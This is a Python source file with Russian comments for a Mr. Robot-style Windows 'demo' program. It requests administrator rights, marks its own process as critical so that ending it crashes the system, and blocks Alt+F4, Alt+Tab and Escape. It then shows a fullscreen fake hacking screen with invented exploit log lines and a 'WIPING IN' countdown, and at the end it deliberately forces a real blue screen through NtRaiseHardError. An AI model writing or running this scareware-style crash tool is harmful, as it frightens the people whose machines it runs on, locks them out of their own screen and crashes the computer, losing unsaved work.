"""
fsociety_adaptive.py
Адаптивная демонстрационная программа в стиле Mr. Robot.
Автоматически получает права администратора, защищает процесс,
масштабируется под любое разрешение и завершается реальным BSOD.
"""

import os
import customtkinter as ctk
from PIL import Image
import random
import time
import ctypes
import sys

def resource_path(relative_path):
    """ Получает абсолютный путь к ресурсам, работает и в dev, и в PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# ----------------------------------------------------------------------
# КОНФИГУРАЦИЯ
# ----------------------------------------------------------------------
BG_COLOR = "#050505"           # Глубокий чёрный
TEXT_COLOR = "#00FF00"         # Неоново-зелёный
ACCENT_RED = "#FF0000"         # Красный для акцентов
FONT_FAMILY = "Courier New"

COUNTDOWN_START = 10           # Общее время в секундах

# Технические сообщения в стиле эксплойтов / руткитов
LOG_MESSAGES = [
    "[SYS] Exploiting CVE-2024-1337...",
    "[ROOT] Overwriting MBR...",
    "[FS] Mounting hidden volume...",
    "[NET] Bypassing firewall rules...",
    "[AUTH] Escalating to SYSTEM...",
    "[CRYPTO] Extracting private keys...",
    "[PERSIST] Installing bootkit...",
    "[MEM] Patching kernel...",
    "[AV] Disabling Windows Defender...",
    "[RAT] Establishing C2 channel...",
    "[WIPE] Zeroing shadow copies...",
]

# ----------------------------------------------------------------------
# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА И ПОВЫШЕНИЕ
# ----------------------------------------------------------------------
def is_admin():
    """Возвращает True, если процесс запущен с правами администратора."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_to_admin():
    """Перезапускает скрипт от имени администратора, если прав недостаточно."""
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit(0)

# ----------------------------------------------------------------------
# ЗАЩИТА КРИТИЧЕСКОГО ПРОЦЕССА (BSOD ПРИ ЗАВЕРШЕНИИ)
# ----------------------------------------------------------------------
def enable_critical_process():
    """
    Помечает текущий процесс как критический.
    При попытке завершить процесс (например, через Диспетчер задач) система уходит в BSOD.
    """
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except Exception as e:
        print(f"[!] Не удалось установить защиту критического процесса: {e}")

# ----------------------------------------------------------------------
# ГЛАВНЫЙ КЛАСС ПРИЛОЖЕНИЯ
# ----------------------------------------------------------------------
class FsocietyCyberDemo:
    def __init__(self):
        # Сначала права администратора и защита процесса
        elevate_to_admin()
        enable_critical_process()

        self.root = ctk.CTk()
        self.root.withdraw()

        # Получаем реальное разрешение экрана и вычисляем коэффициент масштабирования
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()
        self.SF = self.screen_width / 1920.0   # Scaling Factor относительно 1920x1080

        self.stage1()

    def disable_alt_f4(self, window):
        """Блокирует Alt+F4, Escape и закрытие окна через декорации."""
        window.protocol("WM_DELETE_WINDOW", lambda: None)
        window.bind("<Alt-KeyPress-F4>", lambda e: "break")
        window.bind("<Alt-KeyPress-Tab>", lambda e: "break")
        window.bind("<Escape>", lambda e: "break")

    # ------------------------------------------------------------------
    # STAGE 1 – МИГАЮЩЕЕ ПРЕДУПРЕЖДЕНИЕ (2 секунды)
    # ------------------------------------------------------------------
    def stage1(self):
        self.stage1_win = ctk.CTkToplevel(self.root)
        self.stage1_win.title("")
        self.stage1_win.overrideredirect(True)
        self.stage1_win.attributes("-topmost", True)
        self.disable_alt_f4(self.stage1_win)

        # Адаптивный размер окна предупреждения
        win_width = int(700 * self.SF)
        win_height = int(250 * self.SF)
        x = (self.screen_width - win_width) // 2
        y = (self.screen_height - win_height) // 2
        self.stage1_win.geometry(f"{win_width}x{win_height}+{x}+{y}")

        border_width = max(2, int(10 * self.SF))
        self.stage1_frame = ctk.CTkFrame(
            self.stage1_win,
            fg_color="black",
            border_width=border_width,
            border_color="red",
            corner_radius=0,
        )
        self.stage1_frame.pack(fill="both", expand=True)

        # Размер шрифта зависит от коэффициента масштабирования
        font_size = int(40 * self.SF)
        self.stage1_label = ctk.CTkLabel(
            self.stage1_frame,
            text="NO ESCAPE.\nSYSTEM UNDER CONTROL.",
            font=ctk.CTkFont(family="Arial", size=font_size, weight="bold"),
            text_color="red",
            justify="center",
        )
        self.stage1_label.pack(expand=True)

        self.flash_count = 0
        self.flash_stage1()
        self.root.after(2000, self.stage1_complete)

    def flash_stage1(self):
        if self.flash_count >= 8:
            return
        if self.flash_count % 2 == 0:
            self.stage1_label.configure(text_color="white")
            self.stage1_frame.configure(fg_color="red", border_color="darkred")
        else:
            self.stage1_label.configure(text_color="red")
            self.stage1_frame.configure(fg_color="black", border_color="red")
        self.flash_count += 1
        self.root.after(250, self.flash_stage1)

    def stage1_complete(self):
        self.stage1_win.destroy()
        self.stage2()

    # ------------------------------------------------------------------
    # STAGE 2 – ГЛАВНЫЙ ЭКРАН (ЧИСТЫЙ, ТЁМНЫЙ, ТЕРМИНАЛЬНЫЙ СТИЛЬ)
    # ------------------------------------------------------------------
    def stage2(self):
        self.stage2_win = ctk.CTkToplevel(self.root)
        self.stage2_win.title("fsociety")
        self.stage2_win.attributes("-fullscreen", True)
        self.stage2_win.overrideredirect(True)
        self.stage2_win.attributes("-topmost", True)
        self.disable_alt_f4(self.stage2_win)
        self.stage2_win.configure(fg_color=BG_COLOR)

        # ---- Бинарный фон (Canvas) ----
        self.canvas = ctk.CTkCanvas(
            self.stage2_win,
            bg=BG_COLOR,
            highlightthickness=0,
            bd=0,
        )
        self.canvas.place(relx=0, rely=0, relwidth=1, relheight=1)
        self.binary_columns = []
        self.binary_active = True
        self.init_binary_overlay()
        self.animate_binary()

        # ---- Основной фрейм поверх фона ----
        main_frame = ctk.CTkFrame(self.stage2_win, fg_color="transparent")
        main_frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.9, relheight=0.9)
        main_frame.grid_columnconfigure(0, weight=1)

        # ---- Маска fsociety с анимацией дыхания и глитчем ----
        try:
            self.original_mask = Image.open("mask.png")
            # Базовый размер маски – пропорционально ширине экрана с учётом SF
            self.base_mask_width = int(350 * self.SF)
            self.mask_scale = 1.0
            self.update_mask_image()
            self.mask_label = ctk.CTkLabel(main_frame, image=self.mask_ctk_img, text="")
            pady_mask = int(20 * self.SF)
            self.mask_label.grid(row=0, column=0, pady=(0, pady_mask))
            self.pulse_direction = 1
            self.root.after(50, self.pulse_mask)
        except Exception as e:
            print(f"Ошибка загрузки mask.png: {e}")
            font_size = int(24 * self.SF)
            placeholder = ctk.CTkLabel(
                main_frame,
                text="[ fsociety mask ]",
                font=ctk.CTkFont(family=FONT_FAMILY, size=font_size, weight="bold"),
                text_color=TEXT_COLOR,
            )
            placeholder.grid(row=0, column=0, pady=(0, pady_mask))

        # ---- Лог с глитчами (сверхбыстрый скролл) ----
        log_height = int(150 * self.SF)
        log_font_size = int(14 * self.SF)
        self.log_textbox = ctk.CTkTextbox(
            main_frame,
            height=log_height,
            font=ctk.CTkFont(family=FONT_FAMILY, size=log_font_size),
            fg_color=BG_COLOR,
            text_color=TEXT_COLOR,
            border_width=0,
            wrap="word",
        )
        pady_log = int(20 * self.SF)
        self.log_textbox.grid(row=1, column=0, sticky="ew", pady=(0, pady_log))
        self.log_textbox.insert("1.0", "> INIT SEQUENCE...\n")
        self.log_textbox.configure(state="disabled")

        # ---- Статичное сообщение fsociety (с эффектом глитча) ----
        static_font_size = int(24 * self.SF)
        self.static_label = ctk.CTkLabel(
            main_frame,
            text="HELLO, FRIEND. THE ILLUSION OF SECURITY IS OVER. FUCK SOCIETY.",
            font=ctk.CTkFont(family=FONT_FAMILY, size=static_font_size, weight="bold"),
            text_color=TEXT_COLOR,
        )
        pady_static = int(10 * self.SF)
        self.static_label.grid(row=2, column=0, pady=pady_static)
        self.glitch_labels = [self.static_label]
        self.root.after(200, self.apply_glitch_to_labels)

        # ---- Цифровой таймер ----
        timer_font_size = int(48 * self.SF)
        self.seconds_left = COUNTDOWN_START
        self.timer_label = ctk.CTkLabel(
            main_frame,
            text=f"WIPING IN: 00:{self.seconds_left:02d}",
            font=ctk.CTkFont(family=FONT_FAMILY, size=timer_font_size, weight="bold"),
            text_color=TEXT_COLOR,
        )
        pady_timer = int(20 * self.SF)
        self.timer_label.grid(row=3, column=0, pady=pady_timer)

        # ---- Нижнее сообщение (анимация печати с 3 секунд) ----
        goodbye_font_size = int(18 * self.SF)
        self.goodbye_label = ctk.CTkLabel(
            main_frame,
            text="",
            font=ctk.CTkFont(family=FONT_FAMILY, size=goodbye_font_size, weight="bold"),
            text_color=ACCENT_RED,
        )
        pady_goodbye = int(10 * self.SF)
        self.goodbye_label.grid(row=4, column=0, pady=(pady_goodbye, 0))
        self.typing_text = "Goodbye."
        self.typing_index = 0
        self.typing_active = False

        # ---- Запуск анимаций ----
        self.log_index = 0
        self.root.after(40, self.add_log_line)      # ультрабыстрый лог
        self.root.after(1000, self.update_timer)

    # ------------------------------------------------------------------
    # БИНАРНЫЙ ФОН (скроллинг символов 0/1/A-F)
    # ------------------------------------------------------------------
    def init_binary_overlay(self):
        width = self.screen_width
        height = self.screen_height
        # Ширина колонки зависит от масштаба
        col_width = max(15, int(20 * self.SF))
        num_cols = max(1, width // col_width)
        font_size = max(8, int(10 * self.SF))
        for i in range(num_cols):
            x = i * col_width
            length = random.randint(5, 25)
            chars = [random.choice("01ABCDEF") for _ in range(length)]
            col_id = self.canvas.create_text(
                x, -20, text="\n".join(chars),
                fill="#00AA00", font=("Courier New", font_size),
                anchor="n", state="normal"
            )
            speed = random.randint(2, 8)
            self.binary_columns.append({
                "id": col_id,
                "speed": speed,
                "x": x,
                "chars": chars,
                "y_offset": random.randint(-500, 0)
            })

    def animate_binary(self):
        if not self.binary_active:
            return
        try:
            for col in self.binary_columns:
                if not self.canvas.find_withtag(col["id"]):
                    continue
                self.canvas.move(col["id"], 0, col["speed"])
                coords = self.canvas.coords(col["id"])
                if coords and len(coords) >= 2:
                    y = coords[1]
                    if y > self.screen_height + 50:
                        self.canvas.coords(col["id"], col["x"], -20)
                else:
                    # Пересоздать элемент при потере
                    font_size = max(8, int(10 * self.SF))
                    col_id = self.canvas.create_text(
                        col["x"], -20, text="\n".join(col["chars"]),
                        fill="#00AA00", font=("Courier New", font_size),
                        anchor="n", state="normal"
                    )
                    col["id"] = col_id
        except Exception:
            pass
        finally:
            self.root.after(80, self.animate_binary)

    # ------------------------------------------------------------------
    # ЭФФЕКТ ГЛИТЧА (случайная замена символов в статичной надписи)
    # ------------------------------------------------------------------
    def apply_glitch_to_labels(self):
        for label in self.glitch_labels:
            original = label.cget("text")
            if random.random() < 0.3:
                glitched = list(original)
                for _ in range(random.randint(1, 3)):
                    idx = random.randint(0, len(glitched)-1)
                    glitched[idx] = random.choice("#@$%&*!?<>")
                label.configure(text="".join(glitched))
                self.root.after(80, lambda l=label, o=original: l.configure(text=o))
        self.root.after(300, self.apply_glitch_to_labels)

    # ------------------------------------------------------------------
    # АНИМАЦИЯ ДЫХАНИЯ МАСКИ (масштабирование)
    # ------------------------------------------------------------------
    def update_mask_image(self):
        new_width = int(self.base_mask_width * self.mask_scale)
        ratio = new_width / self.original_mask.width
        new_height = int(self.original_mask.height * ratio)
        resized = self.original_mask.resize((new_width, new_height), Image.Resampling.LANCZOS)
        self.mask_ctk_img = ctk.CTkImage(light_image=resized, dark_image=resized, size=(new_width, new_height))

    def pulse_mask(self):
        if hasattr(self, 'mask_label'):
            self.mask_scale += 0.008 * self.pulse_direction
            if self.mask_scale > 1.08:
                self.mask_scale = 1.08
                self.pulse_direction = -1
            elif self.mask_scale < 0.94:
                self.mask_scale = 0.94
                self.pulse_direction = 1
            self.update_mask_image()
            self.mask_label.configure(image=self.mask_ctk_img)
            self.root.after(40, self.pulse_mask)

    # ------------------------------------------------------------------
    # СКРОЛЛИНГ ЛОГА С ГЛИТЧЕМ (3x скорость)
    # ------------------------------------------------------------------
    def glitchify(self, text):
        glitch_chars = "#@$%&*!?<>"
        prefix = ''.join(random.choice(glitch_chars) for _ in range(random.randint(2, 5)))
        if random.random() < 0.4:
            pos = random.randint(0, len(text)-1)
            text = text[:pos] + random.choice(glitch_chars) + text[pos:]
        return f"[{prefix}] {text}"

    def add_log_line(self):
        self.log_textbox.configure(state="normal")
        if self.log_index < len(LOG_MESSAGES):
            line = LOG_MESSAGES[self.log_index]
            self.log_index += 1
        else:
            line = random.choice([
                "[SYS] Injecting shellcode...",
                "[ROOT] Patching kernel syscalls...",
                "[FS] Corrupting NTFS journal...",
                "[NET] ARP poisoning...",
                "[AV] Unloading driver...",
            ])
        glitched = self.glitchify(line)
        timestamp = time.strftime("%H:%M:%S")
        self.log_textbox.insert("end", f"[{timestamp}] {glitched}\n")
        self.log_textbox.see("end")
        self.log_textbox.configure(state="disabled")
        delay = random.randint(20, 60)
        self.root.after(delay, self.add_log_line)

    # ------------------------------------------------------------------
    # ОБРАТНЫЙ ОТСЧЁТ И АНИМАЦИЯ ПЕЧАТИ
    # ------------------------------------------------------------------
    def update_timer(self):
        if self.seconds_left > 0:
            self.seconds_left -= 1
            mins, secs = divmod(self.seconds_left, 60)
            timer_text = f"WIPING IN: {mins:02d}:{secs:02d}"
            self.timer_label.configure(text=timer_text)

            # Ровно за 3 секунды до конца запускаем печать прощальной фразы
            if self.seconds_left == 3:
                self.start_typing_animation()

            self.root.after(1000, self.update_timer)
        else:
            self.timer_label.configure(text="WIPING...")
            self.root.after(500, self.stage2_complete)

    def start_typing_animation(self):
        """Быстрая печать неоново-красного сообщения внизу."""
        self.typing_active = True
        self.typing_index = 0
        self.goodbye_label.configure(text="")
        self.type_next_char()

    def type_next_char(self):
        if not self.typing_active:
            return
        if self.typing_index < len(self.typing_text):
            current = self.goodbye_label.cget("text")
            self.goodbye_label.configure(text=current + self.typing_text[self.typing_index])
            self.typing_index += 1
            self.root.after(50, self.type_next_char)  # 50 мс на символ
        else:
            self.typing_active = False

    # ------------------------------------------------------------------
    # ЗАВЕРШЕНИЕ STAGE 2 → ЧЁРНЫЙ ЭКРАН → BSOD
    # ------------------------------------------------------------------
    def stage2_complete(self):
        self.binary_active = False
        self.stage2_win.destroy()
        self.show_goodbye_and_bsod()

    def show_goodbye_and_bsod(self):
        """Полноэкранный чёрный экран с красной надписью, затем BSOD."""
        self.final_win = ctk.CTkToplevel(self.root)
        self.final_win.title("")
        self.final_win.attributes("-fullscreen", True)
        self.final_win.overrideredirect(True)
        self.final_win.attributes("-topmost", True)
        self.final_win.configure(fg_color="black")

        # Размер шрифта адаптивный
        font_size = int(72 * self.SF)
        label = ctk.CTkLabel(
            self.final_win,
            text="Goodbye, friend. It's time to wake up.",
            font=ctk.CTkFont(family="Courier New", size=font_size, weight="bold"),
            text_color=ACCENT_RED,
        )
        label.place(relx=0.5, rely=0.5, anchor="center")

        # Ждём 1.5 секунды и вызываем реальный BSOD
        self.root.after(1500, self.trigger_real_bsod)

    # ------------------------------------------------------------------
    # НАСТОЯЩИЙ СИНИЙ ЭКРАН СМЕРТИ (Windows Kernel Panic)
    # ------------------------------------------------------------------
    def trigger_real_bsod(self):
        """
        Вызывает неустранимую ошибку уровня ядра с кодом 0xC000021A.
        Система немедленно уходит в BSOD.
        """
        try:
            # Включаем привилегию SeShutdownPrivilege (необходима для NtRaiseHardError)
            privilege_id = 19
            enabled = ctypes.c_bool(False)
            ctypes.windll.ntdll.RtlAdjustPrivilege(
                privilege_id, True, False, ctypes.byref(enabled)
            )
            # Вызываем жёсткую ошибку
            response = ctypes.c_uint()
            ctypes.windll.ntdll.NtRaiseHardError(
                0xC000021A, 0, 0, 0, 6, ctypes.byref(response)
            )
        except Exception as e:
            print(f"Не удалось вызвать BSOD: {e}")
            self.root.quit()

    def quit_app(self):
        self.root.quit()

# ----------------------------------------------------------------------
# ТОЧКА ВХОДА
# ----------------------------------------------------------------------
if __name__ == "__main__":
    # Первым делом повышаем привилегии
    elevate_to_admin()
    app = FsocietyCyberDemo()
    app.root.mainloop()